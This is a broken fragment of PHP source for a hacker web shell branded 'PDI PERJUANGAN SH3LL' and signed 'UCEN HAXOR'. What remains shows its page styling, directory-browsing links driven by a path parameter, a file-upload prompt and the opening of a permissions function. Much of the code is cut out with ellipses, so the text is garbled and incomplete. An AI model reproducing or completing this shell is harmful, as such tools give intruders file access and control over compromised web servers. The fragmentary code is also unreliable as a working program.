...
<html>
<head>
<title>PDI PERJUANGAN SH3LL</title>
...
body {
  ...
  background:    #ff0d0d;line-height: 1;color: #fff;font-family: Comic Sans MS ;
...
echo '</head>
<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Roundel_of_Indonesia_%281946-1949%29.svg/1024px-Roundel_of_Indonesia_%281946-1949%29.svg.png" type="image/x-icon">
<body><b>
<H1><center> &lt;/&gt; <font color="white">xXx PDI </font><font color="white">PERJUANGAN SH3LL xXx</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>Upload file: <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<br><center>PDI PERJUANGAN PRIVATE SH3L BY UCEN HAXOR</b></body>
</html>';
function perms($file){
